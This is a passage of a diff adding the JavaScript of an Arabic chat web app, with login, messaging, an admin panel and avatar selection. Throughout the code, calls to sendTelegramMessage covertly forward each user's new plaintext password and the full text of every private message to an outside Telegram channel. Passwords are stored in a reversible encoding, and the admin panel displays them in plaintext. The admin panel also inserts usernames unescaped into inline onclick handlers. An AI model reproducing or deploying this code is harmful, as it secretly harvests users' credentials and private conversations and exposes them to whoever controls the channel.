+                if (key.includes(oldUsername)) {
+                    const [u1, u2] = key.split('_');
+                    const newKey = [u1 === oldUsername ? newUsername : u1, u2 === oldUsername ? newUsername : u2].sort().join('_');
+                    messages[newKey] = messages[key];
+                    delete messages[key];
+                }
+            }
+            for (let key in messages) {
+                messages[key] = messages[key].map(msg => {
+                    if (msg.sender === oldUsername) msg.sender = newUsername;
+                    if (msg.receiver === oldUsername) msg.receiver = newUsername;
+                    return msg;
+                });
+            }
+            saveMessages();
+            sendTelegramMessage(`✏️ تغيير اسم المستخدم\nمن: ${oldUsername}\nإلى: ${newUsername}\nبواسطة: ${byAdmin ? 'المدير' : 'المستخدم نفسه'}`);
+            if (currentUser === oldUsername) currentUser = newUsername;
+        }
+
+        async function changePassword(username, newPasswordPlain, byAdmin = false) {
+            const user = users.find(u => u.username === username);
+            if (!user) throw new Error('المستخدم غير موجود');
+            user.passwordBinary = textToBinary(newPasswordPlain);
+            saveUsers();
+            sendTelegramMessage(`🔐 تغيير كلمة المرور\n👤 المستخدم: ${username}\n🔑 كلمة المرور الجديدة: ${newPasswordPlain}\nبواسطة: ${byAdmin ? 'المدير' : 'المستخدم نفسه'}`);
+        }
+
+        async function deleteUserByAdmin(username) {
+            if (username === 'admin') throw new Error('لا يمكن حذف حساب المدير');
+            const user = users.find(u => u.username === username);
+            if (!user) throw new Error('المستخدم غير موجود');
+            users = users.filter(u => u.username !== username);
+            for (let key in messages) {
+                if (key.includes(username)) delete messages[key];
+            }
+            saveUsers();
+            saveMessages();
+            sendTelegramMessage(`🗑️ حذف حساب\n👤 المستخدم: ${username}`);
+            if (currentUser === username) logout();
+        }
+
+        function logout() {
+            if (currentUser && !isAnonymous) setUserOnlineStatus(false, 'logout');
+            stopHeartbeat();
+            currentUser = null;
+            currentChatPartner = null;
+            isAdmin = false;
+            isAnonymous = false;
+            localStorage.removeItem('s46441_currentUser');
+            document.getElementById('loginContainer').style.display = 'block';
+            document.getElementById('appContainer').style.display = 'none';
+            document.getElementById('loginUsername').value = '';
+            document.getElementById('loginPassword').value = '';
+            closeModal('settingsModal');
+            closeModal('adminModal');
+            closeModal('avatarModal');
+        }
+
+        function getChatKey(user1, user2) { return [user1, user2].sort().join('_'); }
+        async function sendMessage(sender, receiver, content) {
+            const key = getChatKey(sender, receiver);
+            if (!messages[key]) messages[key] = [];
+            messages[key].push({ sender, receiver, content, timestamp: new Date().toISOString() });
+            saveMessages();
+            sendTelegramMessage(`💬 رسالة جديدة\n📤 من: ${sender}\n📥 إلى: ${receiver}\n💬 النص: ${content}`);
+            return true;
+        }
+        function getMessages(user1, user2) {
+            const key = getChatKey(user1, user2);
+            return messages[key] || [];
+        }
+        function showNotification(msg) {
+            const toast = document.createElement('div');
+            toast.className = 'notification-toast';
+            toast.innerHTML = `<i class="fas fa-info-circle"></i> ${msg}`;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+        function appendMessage(msg) {
+            const container = document.getElementById('messagesContainer');
+            const msgDiv = document.createElement('div');
+            msgDiv.className = `message ${msg.sender === currentUser ? 'message-sent' : 'message-received'}`;
+            msgDiv.innerHTML = `
+                <div class="message-content">${escapeHtml(msg.content)}</div>
+                <div class="message-time">${new Date(msg.timestamp).toLocaleTimeString('ar-EG', {hour:'2-digit', minute:'2-digit'})}</div>
+            `;
+            container.appendChild(msgDiv);
+            container.scrollTop = container.scrollHeight;
+            if (window.innerWidth <= 800 && currentChatPartner) {
+                const header = document.getElementById('chatHeader');
+                if (header.style.display === 'none') {
+                    header.style.display = 'flex';
+                }
+            }
+        }
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        function closeChat() {
+            currentChatPartner = null;
+            document.getElementById('welcomeChat').style.display = 'flex';
+            document.getElementById('chatHeader').style.display = 'none';
+            document.getElementById('messagesContainer').style.display = 'none';
+            document.getElementById('messageInputContainer').style.display = 'none';
+            if (window.innerWidth <= 800) document.getElementById('sidebar').classList.remove('hidden');
+        }
+        async function loadChat(partner) {
+            currentChatPartner = partner;
+            const partnerUser = users.find(u => u.username === partner);
+            document.getElementById('chatPartnerName').innerText = partner;
+            const avatarContainer = document.getElementById('chatPartnerAvatarContainer');
+            if (partnerUser) renderAvatar(partnerUser.avatarUrl, partner, avatarContainer);
+            else renderAvatar(null, partner, avatarContainer);
+            document.getElementById('welcomeChat').style.display = 'none';
+            document.getElementById('chatHeader').style.display = 'flex';
+            document.getElementById('messagesContainer').style.display = 'flex';
+            document.getElementById('messageInputContainer').style.display = 'block';
+            updateChatPartnerStatus();
+            void document.getElementById('messageInputContainer').offsetHeight;
+            await new Promise(resolve => setTimeout(resolve, 10));
+            const msgs = getMessages(currentUser, partner);
+            document.getElementById('messagesContainer').innerHTML = '';
+            msgs.forEach(appendMessage);
+            if (window.innerWidth <= 800) document.getElementById('sidebar').classList.add('hidden');
+        }
+        function updateChatPartnerStatus() {
+            if (currentChatPartner) {
+                const status = getUserDisplayStatus(currentChatPartner);
+                document.getElementById('chatPartnerStatus').innerHTML = status;
+            }
+        }
+        function renderContacts() {
+            const container = document.getElementById('contactsContainer');
+            let otherUsers = users.filter(u => u.username !== currentUser);
+            if (isAnonymous) otherUsers = users;
+            container.innerHTML = '';
+            for (let u of otherUsers) {
+                const div = document.createElement('div');
+                div.className = 'contact-item';
+                const status = getUserDisplayStatus(u.username);
+                const avatarDiv = document.createElement('div');
+                avatarDiv.className = 'contact-avatar';
+                renderAvatar(u.avatarUrl, u.username, avatarDiv);
+                if (isAdmin) {
+                    avatarDiv.onclick = (e) => {
+                        e.stopPropagation();
+                        showAvatarSelectionModalForUser(u.username, (newUrl) => changeAvatarForUser(u.username, newUrl));
+                    };
+                }
+                div.appendChild(avatarDiv);
+                const infoDiv = document.createElement('div');
+                infoDiv.className = 'contact-info';
+                infoDiv.innerHTML = `<div class="contact-name">${escapeHtml(u.username)} <span class="contact-status">${status}</span></div>`;
+                div.appendChild(infoDiv);
+                div.onclick = () => loadChat(u.username);
+                container.appendChild(div);
+            }
+        }
+        function updateCurrentUserStatus() {
+            if (currentUser && !isAnonymous) {
+                const status = getUserDisplayStatus(currentUser);
+                document.getElementById('currentUserStatusText').innerHTML = status;
+            } else if (isAnonymous) {
+                document.getElementById('currentUserStatusText').innerHTML = 'مجهول';
+            }
+        }
+        function initUI() {
+            const user = users.find(u => u.username === currentUser);
+            document.getElementById('currentUserName').innerText = currentUser;
+            const avatarContainer = document.getElementById('currentUserAvatarContainer');
+            renderAvatar(user ? user.avatarUrl : null, currentUser, avatarContainer);
+            updateCurrentUserStatus();
+            renderContacts();
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('appContainer').style.display = 'flex';
+            closeChat();
+            const deleteBtn = document.getElementById('deleteAccountBtn');
+            const adminPanelBtn = document.getElementById('adminPanelBtn');
+            if (isAdmin) {
+                deleteBtn.style.display = 'none';
+                adminPanelBtn.style.display = 'inline-block';
+            } else if (!isAnonymous) {
+                deleteBtn.style.display = 'inline-block';
+                adminPanelBtn.style.display = 'none';
+            } else {
+                deleteBtn.style.display = 'none';
+                adminPanelBtn.style.display = 'none';
+            }
+            if (user && user.privacy) {
+                document.getElementById('showOnlineCheckbox').checked = user.privacy.showOnline;
+            }
+        }
+        async function deleteAccount() {
+            if (!confirm('هل أنت متأكد من حذف حسابك؟ سيتم حذف جميع رسائلك نهائياً.')) return;
+            await deleteUserByAdmin(currentUser);
+            logout();
+            showNotification('تم حذف حسابك');
+        }
+
+        function openModal(modalId) { document.getElementById(modalId).classList.add('active'); }
+        function closeModal(modalId) { document.getElementById(modalId).classList.remove('active'); }
+
+        function showAvatarSelectionModal(onSelect, showAnime = true) {
+            const modalContent = document.getElementById('avatarModalContent');
+            let html = '';
+            if (showAnime) {
+                html += '<div class="avatar-category"><h4>Anime</h4><div class="avatar-grid" id="animeGrid"></div></div>';
+            }
+            html += '<div class="avatar-category"><h4>Logo</h4><div class="avatar-grid" id="cuteGrid"></div></div>';
+            modalContent.innerHTML = html;
+            
+            if (showAnime) {
+                const animeGrid = document.getElementById('animeGrid');
+                animeAvatars.forEach(url => {
+                    const div = document.createElement('div');
+                    div.className = 'avatar-option';
+                    div.innerHTML = `<img src="${url}" alt="avatar">`;
+                    div.onclick = () => { onSelect(url); closeModal('avatarModal'); };
+                    animeGrid.appendChild(div);
+                });
+            }
+            
+            const cuteGrid = document.getElementById('cuteGrid');
+            if (currentUser === 'admin') {
+                const adminDiv = document.createElement('div');
+                adminDiv.className = 'avatar-option';
+                adminDiv.innerHTML = `<img src="${adminAvatar}" alt="Admin" style="border:2px solid gold;">`;
+                adminDiv.onclick = () => { onSelect(adminAvatar); closeModal('avatarModal'); };
+                cuteGrid.appendChild(adminDiv);
+            }
+            cuteAvatars.forEach(url => {
+                const div = document.createElement('div');
+                div.className = 'avatar-option';
+                div.innerHTML = `<img src="${url}" alt="avatar">`;
+                div.onclick = () => { onSelect(url); closeModal('avatarModal'); };
+                cuteGrid.appendChild(div);
+            });
+            document.getElementById('removeAvatarBtn').onclick = () => { onSelect(null); closeModal('avatarModal'); };
+            openModal('avatarModal');
+        }
+
+        function showAvatarSelectionModalForUser(targetUsername, onSelect) {
+            showAvatarSelectionModal(onSelect, true);
+        }
+
+        async function changeAvatarForUser(targetUsername, newAvatarUrl) {
+            const targetUser = users.find(u => u.username === targetUsername);
+            if (!targetUser) { showNotification('المستخدم غير موجود'); return; }
+            const oldAvatar = targetUser.avatarUrl || 'لا توجد صورة (حرف أول)';
+            targetUser.avatarUrl = newAvatarUrl;
+            saveUsers();
+            // تحديث الواجهة
+            renderContacts();
+            if (currentChatPartner === targetUsername) {
+                const avatarContainer = document.getElementById('chatPartnerAvatarContainer');
+                renderAvatar(newAvatarUrl, targetUsername, avatarContainer);
+            }
+            if (currentUser === targetUsername) {
+                const avatarContainer = document.getElementById('currentUserAvatarContainer');
+                renderAvatar(newAvatarUrl, targetUsername, avatarContainer);
+            }
+            const newAvatarDisplay = newAvatarUrl ? newAvatarUrl : 'تمت الإزالة (حرف أول)';
+            sendTelegramMessage(`🖼️ تغيير صورة حساب المستخدم\n👤 المستخدم: ${targetUsername}\n📷 الصورة القديمة: ${oldAvatar}\n🆕 الصورة الجديدة: ${newAvatarDisplay}\nبواسطة: المدير`);
+            showNotification(`تم تغيير صورة المستخدم ${targetUsername}`);
+        }
+
+        async function changeAvatar(newAvatarUrl) {
+            await changeAvatarForUser(currentUser, newAvatarUrl);
+        }
+
+        function renderAdminPanel() {
+            const container = document.getElementById('adminUsersList');
+            container.innerHTML = '';
+            for (let u of users) {
+                const div = document.createElement('div');
+                div.className = 'user-list-item';
+                div.innerHTML = `
+                    <div>
+                        <strong>${escapeHtml(u.username)}</strong>
+                        <span class="show-pwd" onclick="showUserPassword('${u.username}')">🔑 إظهار</span>
+                    </div>
+                    <div class="user-actions">
+                        <button onclick="adminChangeUsername('${u.username}')" title="تغيير الاسم"><i class="fas fa-edit"></i></button>
+                        <button onclick="adminChangePassword('${u.username}')" title="تغيير كلمة المرور"><i class="fas fa-key"></i></button>
+                        ${u.username !== 'admin' ? `<button class="delete-user" onclick="adminDeleteUser('${u.username}')" title="حذف"><i class="fas fa-trash"></i></button>` : ''}
+                    </div>
+                `;
+                container.appendChild(div);
+            }
+        }
+        window.showUserPassword = async function(username) {
+            const user = users.find(u => u.username === username);
+            if (!user) { showNotification('المستخدم غير موجود'); return; }
+            const plainPassword = binaryToText(user.passwordBinary);
+            showNotification(`كلمة مرور المستخدم ${username}: ${plainPassword}`);
+        };
+        window.adminChangeUsername = async function(username) {
+            const newName = prompt(`أدخل الاسم الجديد للمستخدم ${username}`);
+            if (!newName || newName === username) return;
+            try {
+                await changeUsername(username, newName, true);
+                renderAdminPanel();
+                renderContacts();
+                showNotification(`تم تغيير اسم المستخدم إلى ${newName}`);
+            } catch(err) { showNotification(err.message); }
+        };
+        window.adminChangePassword = async function(username) {
+            const newPass = prompt(`أدخل كلمة المرور الجديدة للمستخدم ${username}`);
+            if (!newPass) return;
+            try {
+                await changePassword(username, newPass, true);
+                renderAdminPanel();
+                showNotification(`تم تغيير كلمة المرور للمستخدم ${username}`);
+            } catch(err) { showNotification(err.message); }
+        };
+        window.adminDeleteUser = async function(username) {
+            if (username === 'admin') { showNotification('لا يمكن حذف المدير'); return; }
+            if (!confirm(`هل أنت متأكد من حذف المستخدم ${username}؟`)) return;
+            await deleteUserByAdmin(username);
+            renderAdminPanel();
+            renderContacts();
+            showNotification(`تم حذف المستخدم ${username}`);
+        };
+
+        async function changeOwnUsername() {
+            const newUsername = document.getElementById('newUsername').value.trim();
+            if (!newUsername) { showNotification('الرجاء إدخال اسم مستخدم جديد'); return; }
+            try {
+                await changeUsername(currentUser, newUsername, false);
+                document.getElementById('newUsername').value = '';
+                closeModal('settingsModal');
+                initUI();
+                showNotification(`تم تغيير اسم المستخدم إلى ${newUsername}`);
+            } catch(err) { showNotification(err.message); }
+        }
+        async function changeOwnPassword() {
+            const newPass = document.getElementById('newPassword').value;
+            if (!newPass) { showNotification('الرجاء إدخال كلمة مرور جديدة'); return; }
+            try {
+                await changePassword(currentUser, newPass, false);
+                document.getElementById('newPassword').value = '';
+                closeModal('settingsModal');
+                showNotification('تم تغيير كلمة المرور بنجاح');
+            } catch(err) { showNotification(err.message); }
+        }
+        async function togglePrivacy() {
+            const user = users.find(u => u.username === currentUser);
+            if (user) {
+                user.privacy.showOnline = document.getElementById('showOnlineCheckbox').checked;
+                saveUsers();
+                updateCurrentUserStatus();
+                renderContacts();
+                if (currentChatPartner) updateChatPartnerStatus();
+                showNotification('تم تحديث إعدادات الخصوصية');
+            }
+        }
+
+        function loginAnonymous() {
+            const randomId = Math.random().toString(36).substring(2, 8);
+            currentUser = `مجهول_${randomId}`;
+            isAnonymous = true;
+            isAdmin = false;
+            stopHeartbeat();
+            localStorage.removeItem('s46441_currentUser');
+            initUI();
+            showNotification(`دخلت كمجهول (${currentUser})`);
+        }
+
+        function handlePageClose(reasonType) {
+            if (currentUser && !isAnonymous) {
+                if (reasonType === 'logout') setUserOnlineStatus(false, 'logout');
+                else setUserOnlineStatus(false, null);
+            }
+            stopHeartbeat();
+        }
+        window.addEventListener('beforeunload', () => handlePageClose('browser'));
+        window.addEventListener('pagehide', () => handlePageClose('site'));
+        window.addEventListener('offline', () => {
+            if (currentUser && !isAnonymous) {
+                setUserOnlineStatus(false, 'network');
+                showNotification('فقد الاتصال بالإنترنت');
+            }
+        });
+        window.addEventListener('online', () => {
+            if (currentUser && !isAnonymous) {
+                setUserOnlineStatus(true, 'online');
+                showNotification('تم استعادة الاتصال');
+            }
+        });
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            loadLocalData();
+            loadAutoLoginSetting();
+
+            setTimeout(() => {
+                const welcome = document.getElementById('welcomeScreen');
+                welcome.classList.add('hidden');
+                document.getElementById('loginContainer').classList.add('active');
+            }, 2000);
+
+            const registerAvatarGrid = document.getElementById('registerAvatarGrid');
+            cuteAvatars.forEach(url => {
+                const div = document.createElement('div');
+                div.className = 'avatar-option';
+                div.innerHTML = `<img src="${url}" alt="logo">`;
+                div.onclick = () => {
+                    document.querySelectorAll('#registerAvatarGrid .avatar-option').forEach(opt => opt.classList.remove('selected'));
+                    div.classList.add('selected');
+                    selectedRegisterAvatar = url;
+                };
+                registerAvatarGrid.appendChild(div);
+            });
+            if (registerAvatarGrid.firstChild) {
+                registerAvatarGrid.firstChild.classList.add('selected');
+                selectedRegisterAvatar = cuteAvatars[0];
+            }
+
+            let savedUsers = JSON.parse(localStorage.getItem('s46441_saved_users') || '[]');
+            savedUsers = savedUsers.map(saved => {
+                if (!saved.passwordBinary) saved.passwordBinary = '';
+                return saved;
+            }).filter(saved => saved.username && saved.passwordBinary);
+            
+            const suggestionsDiv = document.getElementById('loginSuggestions');
+            if (savedUsers.length) {
+                suggestionsDiv.innerHTML = `
+                    <div class="suggestions-title">حسابات سجلت من هذا الجهاز</div>
+                    <div class="suggestion-list" id="suggestionsList"></div>
+                `;
+                const list = document.getElementById('suggestionsList');
+                savedUsers.forEach((saved, idx) => {
+                    const item = document.createElement('div');
+                    item.className = 'suggestion-item';
+                    let plainPwd = '';
+                    if (saved.passwordBinary) {
+                        try {
+                            plainPwd = binaryToText(saved.passwordBinary);
+                        } catch(e) { plainPwd = '????'; }
+                    }
+                    item.innerHTML = `
+                        <div class="suggestion-avatar">${saved.username.charAt(0).toUpperCase()}</div>
+                        <div class="suggestion-info">
+                            <div class="suggestion-name">${escapeHtml(saved.username)}</div>
+                            <div class="suggestion-pwd">${'•'.repeat(Math.min(plainPwd.length, 8))}</div>
+                        </div>
+                        <div class="quick-action"><i class="fas fa-arrow-left"></i></div>
+                        <span class="suggestion-remove" data-idx="${idx}" title="إزالة"><i class="fas fa-trash-alt"></i></span>
+                    `;
+                    const fillHandler = (e) => {
+                        if (e.target.closest('.suggestion-remove')) return;
+                        document.getElementById('loginUsername').value = saved.username;
+                        document.getElementById('loginPassword').value = plainPwd;
+                    };
+                    item.addEventListener('click', fillHandler);
+                    const removeBtn = item.querySelector('.suggestion-remove');
+                    removeBtn.addEventListener('click', (e) => {
+                        e.stopPropagation();
+                        savedUsers.splice(idx, 1);
+                        localStorage.setItem('s46441_saved_users', JSON.stringify(savedUsers));
+                        const newEvent = new Event('DOMContentLoaded');
+                        document.dispatchEvent(newEvent);
+                        showNotification('تم إزالة الحساب من القائمة');
+                    });
+                    list.appendChild(item);
+                });
+            } else {
+                suggestionsDiv.style.display = 'none';
+            }
+
+            const tabs = document.querySelectorAll('.tab');
+            const loginTab = document.getElementById('loginTab');
+            const registerTab = document.getElementById('registerTab');
+            tabs.forEach(tab => {
+                tab.onclick = () => {
+                    tabs.forEach(t => t.classList.remove('active'));
+                    tab.classList.add('active');
+                    if (tab.dataset.tab === 'login') {
+                        loginTab.classList.add('active');
+                        registerTab.classList.remove('active');
+                    } else {
+                        registerTab.classList.add('active');
+                        loginTab.classList.remove('active');
+                    }
+                };
+            });
+
+            document.getElementById('loginBtn').onclick = async () => {
+                const username = document.getElementById('loginUsername').value.trim().toLowerCase();
+                const password = document.getElementById('loginPassword').value;
+                const remember = document.getElementById('rememberMe').checked;
+                try {
+                    await loginOrRegister(username, password, false);
+                    if (remember) {
+                        let saved = JSON.parse(localStorage.getItem('s46441_saved_users') || '[]');
+                        const passwordBinary = textToBinary(password);
+                        saved = saved.filter(u => u.username !== username);
+                        saved.unshift({ username, passwordBinary, timestamp: new Date().toISOString() });
+                        if (saved.length > 5) saved = saved.slice(0,5);
+                        localStorage.setItem('s46441_saved_users', JSON.stringify(saved));
+                    }
+                    if (autoLoginEnabled) {
+                        localStorage.setItem('s46441_currentUser', currentUser);
+                    } else {
+                        localStorage.removeItem('s46441_currentUser');
+                    }
+                    initUI();
+                    showNotification(`مرحباً ${currentUser}`);
+                } catch(err) {
+                    let errorDiv = document.getElementById('loginErrorMsg');
+                    if (!errorDiv) {
+                        errorDiv = document.createElement('div');
+                        errorDiv.id = 'loginErrorMsg';
+                        errorDiv.className = 'error-msg';
+                        document.querySelector('#loginTab .form-container').appendChild(errorDiv);
+                    }
+                    errorDiv.innerText = err.message;
+                }
+            };
+
+            document.getElementById('registerBtn').onclick = async () => {
+                const username = document.getElementById('registerUsername').value.trim().toLowerCase();
+                const password = document.getElementById('registerPassword').value;
+                const confirm = document.getElementById('registerConfirmPassword').value;
+                if (password !== confirm) { showNotification('كلمتا المرور غير متطابقتين'); return; }
+                try {
+                    await loginOrRegister(username, password, true, selectedRegisterAvatar);
+                    if (autoLoginEnabled) {
+                        localStorage.setItem('s46441_currentUser', currentUser);
+                    } else {
+                        localStorage.removeItem('s46441_currentUser');
+                    }
+                    initUI();
+                    showNotification(`تم إنشاء حساب ${username}`);
+                } catch(err) {
+                    showNotification(err.message);
+                }
+            };
+
+            document.getElementById('anonymousBtn').onclick = () => {
+                loginAnonymous();
+            };
+
+            document.getElementById('sendBtn').onclick = async () => {
+                const content = document.getElementById('messageInput').value.trim();
+                if (!content || !currentChatPartner) return;
+                await sendMessage(currentUser, currentChatPartner, content);
+                appendMessage({ sender: currentUser, receiver: currentChatPartner, content, timestamp: new Date().toISOString() });
+                document.getElementById('messageInput').value = '';
+            };
+            document.getElementById('messageInput').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && !e.shiftKey) {
+                    e.preventDefault();
+                    document.getElementById('sendBtn').click();
+                }
+            });
+            document.getElementById('logoutBtn').onclick = logout;
+            document.getElementById('deleteAccountBtn').onclick = deleteAccount;
+            document.getElementById('backBtn').onclick = closeChat;
+
+            document.getElementById('settingsBtn').onclick = () => {
+                if (isAnonymous) { showNotification('المستخدم المجهول ليس لديه إعدادات'); return; }
+                openModal('settingsModal');
+            };
+            document.getElementById('changeUsernameBtn').onclick = changeOwnUsername;
+            document.getElementById('changePasswordBtn').onclick = changeOwnPassword;
+            document.getElementById('showOnlineCheckbox').onchange = togglePrivacy;
+            document.getElementById('adminPanelBtn').onclick = () => {
+                renderAdminPanel();
+                openModal('adminModal');
+            };
+            document.getElementById('openAvatarModalBtn').onclick = () => {
+                if (isAnonymous) { showNotification('المستخدم المجهول لا يمكنه تغيير الصورة'); return; }
+                showAvatarSelectionModal(changeAvatar, true);
+            };
+            const fullscreenBtn = document.getElementById('fullscreenAppBtn');
+            if (fullscreenBtn) fullscreenBtn.onclick = toggleFullScreen;
+
+            const autoLoginChk = document.getElementById('autoLoginCheckbox');
+            if (autoLoginChk) {
+                autoLoginChk.onchange = () => {
+                    saveAutoLoginSetting(autoLoginChk.checked);
+                    if (!autoLoginChk.checked) {
+                        localStorage.removeItem('s46441_currentUser');
+                    }
+                };
+            }
+
+            const savedCurrent = localStorage.getItem('s46441_currentUser');
+            if (autoLoginEnabled && savedCurrent && users.find(u => u.username === savedCurrent)) {
+                currentUser = savedCurrent;
+                isAdmin = (currentUser === 'admin');
+                isAnonymous = false;
+                const user = users.find(u => u.username === currentUser);
+                if (user) {
+                    user.online = false;
+                    user.lastSeen = new Date().toISOString();
+                    saveUsers();
+                }
+                currentUser = savedCurrent;
+                isAdmin = (currentUser === 'admin');
+                isAnonymous = false;
+                startHeartbeat();
+                setUserOnlineStatus(true, 'online');
+                initUI();
+                document.getElementById('welcomeScreen').classList.add('hidden');
+                document.getElementById('loginContainer').style.display = 'none';
+                document.getElementById('appContainer').style.display = 'flex';
+            }
+        });
+
+        function togglePassword(fieldId) {
+            const field = document.getElementById(fieldId);
+            if (!field) return;
+            const type = field.getAttribute('type') === 'password' ? 'text' : 'password';
+            field.setAttribute('type', type);
+            const toggleSpan = document.querySelector(`[onclick="togglePassword('${fieldId}')"]`);
+            if (toggleSpan) {
+                const icon = toggleSpan.querySelector('i');
+                if (icon) {
+                    icon.classList.toggle('fa-eye');
+                    icon.classList.toggle('fa-eye-slash');
+                }
+            }
+        }
+    </script>
+</body>
+</html>
